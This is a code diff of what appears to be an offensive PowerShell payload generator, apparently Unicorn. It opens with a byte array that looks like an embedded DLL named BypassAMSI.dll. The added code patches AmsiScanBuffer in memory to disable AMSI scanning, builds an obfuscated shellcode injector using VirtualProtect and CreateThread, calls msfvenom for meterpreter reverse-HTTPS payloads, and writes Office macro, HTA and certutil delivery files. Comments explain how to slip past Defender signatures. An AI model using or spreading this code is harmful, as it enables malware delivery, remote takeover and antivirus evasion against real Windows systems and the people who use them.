0, 83, 0, 73, 0, 0, 0, 0, 0, 48, 0, 8, 0, 1, 0, 70, 0, 105, 0, 108, 0, 101, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 62, 0, 15, 0, 1, 0, 73, 0, 110, 0, 116, 0, 101, 0, 114, 0, 110, 0, 97, 0, 108, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 65, 0, 77, 0, 83, 0, 73, 0, 46, 0, 100, 0, 108, 0, 108, 0, 0, 0, 0, 0, 72, 0, 18, 0, 1, 0, 76, 0, 101, 0, 103, 0, 97, 0, 108, 0, 67, 0, 111, 0, 112, 0, 121, 0, 114, 0, 105, 0, 103, 0, 104, 0, 116, 0, 0, 0, 67, 0, 111, 0, 112, 0, 121, 0, 114, 0, 105, 0, 103, 0, 104, 0, 116, 0, 32, 0, 169, 0, 32, 0, 32, 0, 50, 0, 48, 0, 49, 0, 56, 0, 0, 0, 42, 0, 1, 0, 1, 0, 76, 0, 101, 0, 103, 0, 97, 0, 108, 0, 84, 0, 114, 0, 97, 0, 100, 0, 101, 0, 109, 0, 97, 0, 114, 0, 107, 0, 115, 0, 0, 0, 0, 0, 0, 0, 0, 0, 70, 0, 15, 0, 1, 0, 79, 0, 114, 0, 105, 0, 103, 0, 105, 0, 110, 0, 97, 0, 108, 0, 70, 0, 105, 0, 108, 0, 101, 0, 110, 0, 97, 0, 109, 0, 101, 0, 0, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 65, 0, 77, 0, 83, 0, 73, 0, 46, 0, 100, 0, 108, 0, 108, 0, 0, 0, 0, 0, 54, 0, 11, 0, 1, 0, 80, 0, 114, 0, 111, 0, 100, 0, 117, 0, 99, 0, 116, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 0, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 65, 0, 77, 0, 83, 0, 73, 0, 0, 0, 0, 0, 52, 0, 8, 0, 1, 0, 80, 0, 114, 0, 111, 0, 100, 0, 117, 0, 99, 0, 116, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 56, 0, 8, 0, 1, 0, 65, 0, 115, 0, 115, 0, 101, 0, 109, 0, 98, 0, 108, 0, 121, 0, 32, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 12, 0, 0, 0, 200, 60, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)) | Out-Null}[%s]::Disable()}""" % (func,func,func))
+    amsi_string = ("""$1111 = @"\nusing System;using System.Runtime.InteropServices;public class Win32 {[DllImport("$kernel32")]public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);[DllImport("$kernel32")] public static extern IntPtr LoadLibrary(string name);[DllImport("$kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);}\n"@\nAdd-Type $1111;$2222 = [Win32]::GetProcAddress([Win32]::LoadLibrary("$amsi$dll"), "$amsi$scan$buffer");$3333 = 0;[Win32]::VirtualProtect($2222, [uint32]5, 0x40, [ref]$3333);$4444 = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3);[System.Runtime.InteropServices.Marshal]::Copy($4444, 0, $2222, 6)""")
     return amsi_string
 
 # this will convert any url to hexformat for download/exec payload
@@ -583,17 +581,18 @@ def scramble_stuff():
 # generate full macro
 def generate_macro(full_attack, line_length=50):
 
+    # we don't want to have AMSI_BYPASS messing with the payload itself so we strip the AMSI Bypass code to run our full powershell payload
+    if ("# actual unicorn payload") in full_attack:
+        full_attack = full_attack.split("actual unicorn payload")[1].split("\n")[1].rstrip()
+
     # randomize macro name
     macro_rand = generate_random_string(5, 10)
-
     # start of the macro
     macro_str = ("Sub Auto_Open()\nDim {0}\n{1} = ".format(macro_rand, macro_rand))
-
     if line_length is None:
         line_length_int = 50
     else:
         line_length_int = int(line_length)
-
     powershell_command_list = split_str(full_attack, line_length_int)
 
     counter = 0
@@ -661,8 +660,7 @@ def gen_cert_attack(filename):
         if os.path.isfile("decode_attack/encoded_attack.crt"):
             os.remove("decode_attack/encoded_attack.crt")
 
-        print(
-            "[*] Importing in binary file to base64 encode it for certutil prep.")
+        print("[*] Importing in binary file to base64 encode it for certutil prep.")
         data = open(filename, "rb").read()
         data = base64.b64encode(data)
         print("[*] Writing out the file to decode_attack/encoded_attack.crt")
@@ -672,10 +670,8 @@ def gen_cert_attack(filename):
         write_file("decode_attack/decode_command.bat",
                    "certutil -decode encoded_attack.crt encoded.exe")
         print("[*] Exported attack under decode_attack/")
-        print(
-            "[*] There are two files, encoded_attack.crt contains your encoded data")
-        print(
-            "[*] The second file, decode_command.bat will decode the cert to an executable.")
+        print("[*] There are two files, encoded_attack.crt contains your encoded data")
+        print("[*] The second file, decode_command.bat will decode the cert to an executable.")
     else:
         print("[!] File was not found. Exiting the unicorn attack.")
         sys.exit()
@@ -725,10 +721,9 @@ def gen_hta_attack(command):
 def format_metasploit(data):
     # start to format this a bit to get it ready
     repls = {';': '', ' ': '', '+': '', '"': '', '\n': '', 'buf=': '', 'Found 0 compatible encoders': '','unsignedcharbuf[]=': ''}
-    data = data.decode()
+    #data = data.decode()
     data = reduce(lambda a, kv: a.replace(*kv),iter(repls.items()), data).rstrip()
     if len(data) < 1:
-        #print("[!] Shellcode was not generated for some reason. Check payload name and if Metasploit is working and try again.")
         print("[!] Critical: It does not appear that your shellcode is formatted properly. Shellcode should be in a 0x00,0x01 format or a Metasploit format.")
         print("[!] Example: msfvenom -p LHOST=192.168.5.5 LPORT=443 -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai -f c")
         print("Exiting....")
@@ -786,16 +781,18 @@ def generate_shellcode(payload, ipaddr, port):
     else:
 
         # gen random number for length
-        uri_length=generate_random_number(3,6)
-        proc = subprocess.Popen("msfvenom -p {0} {1} {2} --smallest --platform windows -f c".format(payload, ipaddr, port, uri_length), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-
-        # AutoUnhookProcess=true AutoVerifySession=false AutoLoadStdapi=false  AutoSystemInfo=false
-
+        #uri_length=generate_random_number(5,7)
+        proc = subprocess.Popen("msfvenom -p {0} {1} {2} -t 0 --platform windows -f c".format(payload, ipaddr, port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        # AutoUnhookProcess=true AutoVerifySession=false AutoLoadStdapi=false  AutoSystemInfo=false --smallest
         data = proc.communicate()[0]
         # If you are reading through the code, you might be scratching your head as to why I replace the first 0xfc (CLD) from the beginning of the Metasploit meterpreter payload. Defender writes signatures here and there for unicorn, and this time they decided to look for 0xfc in the decoded (base64) code through AMSI. Interesting enough in all my testing, we shouldn't need a clear direction flag and the shellcode works fine. If you notice any issues, you can simply just make a variable like $a='0xfc'; at the beginning of the command and add a $a at the beginning of the shellcode which also evades. Easier to just remove if we don't need which makes the payload 4 bytes smaller anyways.
-        # data = data.decode("ascii").replace('"\\xfc', '"', 1)
-        # this isn't needed since we use shikata now, when shikata is removed, the 0xfc is an option
+        data = data.decode("ascii").replace('"\\xfc', '"', 1)
+        # bug output for metasploit, going to check here - if present then throw error message to end user
+        if "no longer be in use" in data or "long,erbe,inus,e,so,tryd,elet,ingt" in data:
+            print("[!] There was a problem generating the shellcode due to a Metasploit error. Please update Metasploit and re-run this.")
+            sys.exit()
 
+    # return the metasploit data
     return format_metasploit(data)
 
 # generate shellcode attack and replace hex
@@ -901,7 +898,8 @@ def gen_shellcode_attack(payload, ipaddr, port):
             reroll = True
         varcheck = varcheck + var16
 
-        var17 = generate_random_string(3,3) # $dllimport
+
+        var17 = "$" + generate_random_string(3,3) # $yyyy
         if var17.lower() in varcheck.lower():
             reroll = True
         varcheck = varcheck + var17
@@ -931,13 +929,11 @@ def gen_shellcode_attack(payload, ipaddr, port):
     # randomize kernel32.dll and msvcrt.dll
     kernel = mangle_word("kernel32.dll")
     msv = mangle_word("msvcrt.dll")
-    virtual_alloc = mangle_word("calloc")
-    create_thread = mangle_word("CreateThread")
-    DllImport = mangle_word("DllImport")
     Win32 = mangle_word("Win32Functions")
     true_mangle = mangle_word("True")
     # here we do a little magic to get around AMSI, no more cat and mouse game here by chunking of shellcode, it's not needed since Defender and AMSI is still signature driven primarily
     random_symbols = ['!', '@', '#', '%', '^', '&', '*', '(', ')', '-', '+', '=', '{', '}', '|', '.', ':', ';', '<', '>', '?', '/']
+    random_symbols = ['}']
     mangle_shellcode = (random.choice(random_symbols))
 
     #mangle_shellcode = generate_random_string(1, 1).upper()
@@ -954,18 +950,21 @@ def gen_shellcode_attack(payload, ipaddr, port):
 
     truevalue = generate_random_string(3,4)
 
-    # one line shellcode injection with native x86 shellcode
-    powershell_code = (r'''$1111='$tttt=''[$dllimport(("%s"))]public static extern IntPtr $allocreplace(uint dwSize, uint amount);[$dllimport("%s")]public static extern IntPtr $createthreadreplace(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[$dllimport("%s")]public static extern IntPtr VirtualProtect(IntPtr lpStartAddress, uint dwSize, uint flNewProtect, out uint %s);[$dllimport("%s")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$tttt=$tttt.replace("$createthreadreplace", "%s");$tttt=$tttt.replace("$allocreplace", "%s");$tttt=$tttt.replace("$dllimport", "%s");$zzzz="%s";$wwww=Add-Type -pass -m $tttt -Name "%s" -names $Win32;$wwww=$wwww.replace("$Win32", "%s");[byte[]]$zzzz = $zzzz.replace("SHELLCODE_STUB","$randomized_byte_namex").replace("$randomized_byte_name", "0").Split(",");$gggg=0x$randstack;if ($zzzz.L -gt 0x$randstack){$gggg=$zzzz.L};$xxxx=$wwww::calloc(0x$randstack, 1);[UInt64]$tempvar = 0;for($iiii=0;$iiii -le($zzzz.Length-1);$iiii++){$wwww::memset([IntPtr]($xxxx.ToInt32()+$iiii), $zzzz[$iiii], 1)};$wwww::VirtualProtect($xxxx, 0x$randstack, 0x40, [Ref]$tempvar);$wwww::CreateThread(0,0x00,$xxxx,0,0,0);';$hhhh=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($1111));$2222="powershell";$4444="Windows";$5555 = "C:\$4444\syswow64\$4444$2222\v1.0\$2222";$$truevalue = '%s';if([environment]::Is64BitOperatingSystem -eq '$$truevalue'){$2222= $5555};$fullcommand=" $2222 $noexit $hhhh";$fullcommand=$fullcommand.replace("$noexit", "-noexit -e");iex $fullcommand''' % (msv,kernel,kernel,tempvar_withoutdollar,msv,create_thread,virtual_alloc,DllImport,shellcode,randomize_service_name,Win32,true_mangle)).replace("SHELLCODE_STUB", mangle_shellcode)
+    # syswow split for obfuscation
+    syswowsplit_1 = generate_random_string(3,4)
+    syswowsplit_2 = generate_random_string(3,4)
 
-    # if we want to use AMSI bypassing, currently snagged by defender based on signature updates - easy to get around if you mangle
-    if AMSI_BYPASS.lower() == "on": 
-        powershell_code = bypass_amsi() + ";" + powershell_code
+    # one line shellcode injection with native x86 shellcode
+    powershell_code = (r'''$1111='$tttt=''[DllImport(("%s"))]public static extern IntPtr calloc(uint dwSize, uint amount);[DllImport("%s")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("%s")]public static extern IntPtr VirtualProtect(IntPtr lpStartAddress, uint dwSize, uint flNewProtect, out uint %s);[DllImport("%s")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$zzzz="%s";$wwww=Add-Type -pass -m $tttt -Name "%s" -names $Win32;$wwww=$wwww.replace("$Win32", "%s");[byte[]]$zzzz = $zzzz.replace("SHELLCODE_STUB","$randomized_byte_namex").replace("$randomized_byte_name", "0").Split(",");$gggg=0x$randstack;if ($zzzz.L -gt 0x$randstack){$gggg=$zzzz.L};$xxxx=$wwww::calloc(0x$randstack, 1);[UInt64]$tempvar = 0;for($iiii=0;$iiii -le($zzzz.Length-1);$iiii++){$wwww::memset([IntPtr]($xxxx.ToInt32()+$iiii), $zzzz[$iiii], 1)};$wwww::VirtualProtect($xxxx, 0x$randstack, 0x40, [Ref]$tempvar);$yyyy=[int]0x00;$wwww::CreateThread([int]0,$yyyy,$xxxx,0,0,0);';$hhhh=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($1111));$2222="powershell";$4444="Windows";$5555 = "C:\$4444\$syswowsplit_1$syswowsplit_2\$4444$2222\v1.0\$2222";$5555 = $5555.replace("$syswowsplit_1", "sys");$5555 = $5555.replace("$syswowsplit_2", "wow64");$$truevalue = '%s';if([environment]::Is64BitOperatingSystem -eq '$$truevalue'){$2222= $5555};$fullcommand=" $2222 $noexit $hhhh";$fullcommand=$fullcommand.replace("$noexit", "-noexit -e");iex $fullcommand''' % (msv,kernel,kernel,tempvar_withoutdollar,msv,shellcode,randomize_service_name,Win32,true_mangle)).replace("SHELLCODE_STUB", mangle_shellcode)
 
     # run it through a lame var replace
     powershell_code = powershell_code.replace("$1111", var1).replace("$cccc", var2).replace(
         "$2222", var3).replace("$3333", var4).replace("$xxxx", var5).replace("$tttt", var6).replace(
         "$hhhh", var7).replace("$zzzz", var8).replace("$gggg", var9).replace("$iiii", var10).replace(
-        "$wwww", var11).replace("$randstack", var12).replace("$4444", var13).replace("$allocreplace", var14).replace("$tempvar", var15).replace("$createthreadreplace", var16).replace("$dllimport", var17).replace("$Win32", var18).replace("$createthread", create_thread).replace("$randomized_byte_name", randomized_byte_name).replace("$fullcommand", "$" + full_command).replace("$5555", "$" + syswow_var).replace("$noexit", noexit).replace("$truevalue", truevalue)
+        "$wwww", var11).replace("$randstack", var12).replace("$4444", var13).replace("$tempvar", var15).replace(
+        "$yyyy", var17).replace("$Win32", var18).replace("$randomized_byte_name", randomized_byte_name).replace(
+        "$fullcommand", "$" + full_command).replace("$5555", "$" + syswow_var).replace("$noexit", noexit).replace(
+        "$truevalue", truevalue).replace("$syswowsplit_1", syswowsplit_1).replace("$syswowsplit_2", syswowsplit_2)
 
     # if we have PRINT_DECODED="ON" this will spit out the raw powershell code for you
     if PRINT_DECODED.lower() == "on":
@@ -1011,11 +1010,32 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
         haha_av = haha_av + surprise_surprise #ThisShouldKeepMattHappy
         haha_av = haha_av.replace("==", "'+'==")
         counter = 1
-
     random_quotes = ["''", '\\"\\"' ]
     mangle_quotes = (random.choice(random_quotes))
 
-    full_attack = '''powershell /w 1 /C "s{0}v {1} -;s{0}v {2} e{0}c;s{0}v {3} ((g{0}v {4}).value.toString()+(g{0}v {5}).value.toString());powershell (g{0}v {6}).value.toString() (\''''.format(mangle_quotes,ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
+    full_attack = '''powershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
+
+    # if we want to use AMSI bypassing
+    if AMSI_BYPASS.lower() == "on": 
+
+        random_symbols = ['!', '@', '#', '%', '^', '&', '*', '(', ')', '-', '+', '=', '{', '}', '|', '.', ':', ';', '<', '>', '?', '/']
+        random_symbols = ['}']
+        mangle_shellcode = (random.choice(random_symbols))
+        # here we mangle the code a bit to get around AMSI detections
+        kernel32 = mangle_word("kernel32")
+        dll = mangle_word(".dll")
+        amsi = mangle_word("Amsi")
+        scan = mangle_word("Scan")
+        buffer = mangle_word("Buffer")
+        one = "$" + generate_random_string(5,10)
+        two = "$" + generate_random_string(5,10)
+        three = "$" + generate_random_string(5,10)
+        four = "$" + generate_random_string(5,10)
+        amsi_string = (bypass_amsi()).replace("$kernel32", kernel32).replace("$dll", dll).replace("$amsi", amsi).replace("$scan", scan).replace("$buffer", buffer).replace("$1111", one).replace("$2222", two).replace("$3333", three).replace("$4444", four)
+        amsi_string = (amsi_string).replace('%s = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3);' % (four), '%s = ("GOATB8, GOAT57, GOAT00, GOAT07, GOAT80, GOATC3").replace("%s", "MOO");%s = [Byte[]](%s).split(",");' % (four, mangle_shellcode, four, four)).replace("GOAT", mangle_shellcode).replace("MOO", "0x")
+        amsi_encoded = base64.b64encode(amsi_string.encode('utf_16_le')).decode('ascii')
+        full_attack = '''# AMSI bypass code - run in same process as unicorn second stage\npowershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + amsi_encoded + "')" + '"' + "\n\n# actual unicorn payload\n" + full_attack
+
     # powershell -w 1 -C "powershell ([char]45+[char]101+[char]99) YwBhAGwAYwA="  <-- Another nasty one that should evade. If you are reading the source, feel free to use and tweak
 
     # for cobalt strike
@@ -1119,9 +1139,10 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
                     print("[*] Windows command prompt has a character restriction of 8191 which if you are using cmd.exe as a payload delivery option, this will not work.")
                     print("[*] Turn off AMSI_BYPASS=ON in the unicorn.py file located at the very top to turn this feature off which is ON by default.")
                     print("[*] If you are calling PowerShell directly, this is not a concern.")
-                print("[!] WARNING. WARNING. Length of the payload is above command line limit length of 8191. Recommend trying to generate again or the line will be cut off.")
-                print("[!] Total Payload Length Size: " + str(len(full_attack)))
-                input("Press {return} to continue.")
+                else:
+                    print("[!] WARNING. WARNING. Length of the payload is above command line limit length of 8191. Recommend trying to generate again or the line will be cut off.")
+                    print("[!] Total Payload Length Size: " + str(len(full_attack)))
+                    input("Press {return} to continue.")
 
             # format for dde specific payload
             if attack_modifier == "dde":
@@ -1158,8 +1179,6 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
 
     # Print completion messages
     if attack_type == "msf" and attack_modifier == "hta":
-        print("[*] Exported index.html, Launcher.hta, and unicorn.rc under hta_attack/.")
-        print("[*] Run msfconsole -r unicorn.rc to launch listener and move index and launcher to web server.\n")
         print("[*] Exported index.html, Launcher.hta, and unicorn.rc under hta_attack/.")
         print("[*] Run msfconsole -r unicorn.rc to launch listener and move index and launcher to web server.\n")
 
@@ -1356,5 +1375,5 @@ except KeyboardInterrupt:
     sys.exit()
 
 except Exception as e:
-    if "list index" in str(e): print("[!] It appears you did not follow the right syntax for Unicorn. Try again, run python unicorn.py for all usage.")
+    if "list index" in str(e): print("[!] It appears you did not follow the right syntax for Unicorn. Try again, run python3 unicorn.py for all usage.")
     else: print("[!] Something went wrong, printing the error: " + str(e))
